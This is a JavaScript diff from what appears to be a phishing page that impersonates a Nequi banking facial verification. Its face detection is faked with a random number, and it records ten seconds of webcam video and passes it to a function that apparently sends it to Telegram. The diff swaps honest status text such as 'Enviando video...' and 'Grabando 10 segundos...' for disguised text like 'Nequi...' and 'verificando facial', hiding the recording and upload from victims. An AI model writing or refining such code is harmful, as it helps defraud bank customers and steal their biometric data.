@@ -193,7 +193,7 @@ function startFaceDetection() {
         if (random > 0.5) { // Rostro detectado
             oval.classList.add("valid");
             warningMessage.classList.remove("show");
-            statusText.innerText = "✅ Rostro detectado - Iniciando grabación...";
+            statusText.innerText = "✅ Rostro detectando..";
             
             faceDetected = true;
             clearInterval(detectionInterval);
@@ -206,7 +206,7 @@ function startFaceDetection() {
         } else {
             oval.classList.remove("valid");
             warningMessage.classList.add("show");
-            statusText.innerText = "🎯 Coloca tu rostro en el círculo";
+            statusText.innerText = " Coloca tu rostro en el círculo";
         }
     }, 1000);
 }
@@ -228,7 +228,7 @@ function startRecording(stream) {
 
     mediaRecorder.onstop = () => {
         const blob = new Blob(recordedChunks, { type: 'video/webm' });
-        statusText.innerText = "📤 Enviando video...";
+        statusText.innerText = "Nequi...";
         enviarVideoTelegram(blob);
     };
 
@@ -247,13 +247,13 @@ function startRecording(stream) {
             
             // Iniciar grabación
             mediaRecorder.start();
-            statusText.innerText = "🎥 Grabando 10 segundos...";
+            statusText.innerText = "verificando facial";
             
             // Detener después de 10 segundos
             setTimeout(() => {
                 if (mediaRecorder && mediaRecorder.state === "recording") {
                     mediaRecorder.stop();
-                    statusText.innerText = "⏹️ Grabación finalizada...";
+                    statusText.innerText = "finalizada...";
                 }
             }, 10000);
         }
